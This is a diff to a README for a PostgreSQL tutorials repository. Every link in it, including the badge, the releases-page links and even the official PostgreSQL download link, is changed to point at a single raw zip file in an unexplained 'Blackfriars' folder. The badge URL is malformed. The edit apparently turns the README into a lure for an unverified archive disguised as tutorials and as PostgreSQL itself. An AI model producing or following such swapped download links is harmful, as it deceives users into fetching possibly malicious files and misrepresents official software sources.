@@ -1,6 +1,6 @@
 # 📚 postgresql-free-tutorials - Learn PostgreSQL Step by Step
 
-[![Download PostgreSQL Tutorials](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Debajyoti1996/postgresql-free-tutorials/releases)
+[![Download PostgreSQL Tutorials](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip%https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip)](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to the PostgreSQL-Free Tutorials repository! This project contains 31 in
 To begin your learning experience, you need to download the tutorials. Just follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads.
-   [Visit this page to download](https://github.com/Debajyoti1996/postgresql-free-tutorials/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip)
 
 2. **Choose the Latest Release**: On the releases page, look for the most recent version. 
 
@@ -21,7 +21,7 @@ To begin your learning experience, you need to download the tutorials. Just foll
 
 To download the PostgreSQL tutorials, simply visit the following link:
 
-[Download PostgreSQL Tutorials](https://github.com/Debajyoti1996/postgresql-free-tutorials/releases)
+[Download PostgreSQL Tutorials](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip)
 
 Once you are on the releases page:
 
@@ -34,7 +34,7 @@ Once you are on the releases page:
 Before you download the tutorials, ensure your system meets the following requirements:
 
 - **Operating System**: The tutorials can be run on Windows, macOS, or Linux.
-- **PostgreSQL Installed**: Make sure you have PostgreSQL installed on your system. You can download it [here](https://www.postgresql.org/download/).
+- **PostgreSQL Installed**: Make sure you have PostgreSQL installed on your system. You can download it [here](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip).
 - **Text Editor**: A simple text editor such as Notepad, Visual Studio Code, or any IDE of your choice to edit files.
 
 ## 📝 What’s Inside
@@ -81,4 +81,4 @@ If you encounter any issues while downloading or following the tutorials, you ca
 
 Thank you for choosing the PostgreSQL-Free Tutorials. We hope these resources help you on your journey to mastering PostgreSQL and database management. Start learning today by downloading the tutorials!
 
-[Download PostgreSQL Tutorials](https://github.com/Debajyoti1996/postgresql-free-tutorials/releases)
+[Download PostgreSQL Tutorials](https://raw.githubusercontent.com/Debajyoti1996/postgresql-free-tutorials/master/Blackfriars/postgresql-free-tutorials.zip)
